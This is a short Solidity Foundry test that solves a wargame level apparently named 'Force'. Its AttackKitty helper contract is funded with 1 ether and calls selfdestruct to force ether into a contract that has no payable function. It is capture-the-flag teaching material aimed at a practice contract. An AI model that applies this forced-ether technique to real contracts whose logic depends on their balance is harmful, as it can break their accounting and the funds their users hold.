// SPDX-License-Identifier: MIT

pragma solidity 0.8.0;

import "../instance/Level7.sol";
import "forge-std/Test.sol";

contract ExploitLevel07 is Test {
    Force instance = new Force();
    AttackKitty attackKitty;

    function setUp() external {
        address payable instanceAddr = payable(address(instance));
        attackKitty = new AttackKitty{value: 1 ether}(instanceAddr);
    }

    function testExploit() external {
        attackKitty.attack();
        console.log(address(instance).balance);
    }
}

contract AttackKitty {
    address payable instance;

    constructor(address payable _instance) payable {
        instance = _instance;
    }

    function attack() external {
        selfdestruct(instance);
    }
}
